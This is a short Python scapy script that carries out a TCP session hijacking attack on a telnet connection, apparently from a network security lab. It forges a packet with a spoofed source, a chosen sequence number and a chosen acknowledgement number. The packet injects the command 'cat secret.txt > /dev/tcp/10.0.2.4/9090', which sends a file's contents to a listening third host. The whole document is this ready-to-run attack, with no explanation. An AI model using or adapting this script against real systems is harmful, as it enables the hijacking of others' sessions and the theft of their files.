from scapy.all import *
ip =IP(src="10.0.2.6", dst="10.0.2.5")
tcp=TCP(sport=40122,dport=23, flags="A",seq=405074665,ack=800631629)
data="\r cat secret.txt> /dev/tcp/10.0.2.4/9090\r"
pkt=ip/tcp/data
pkt.show()
send(pkt,verbose=0)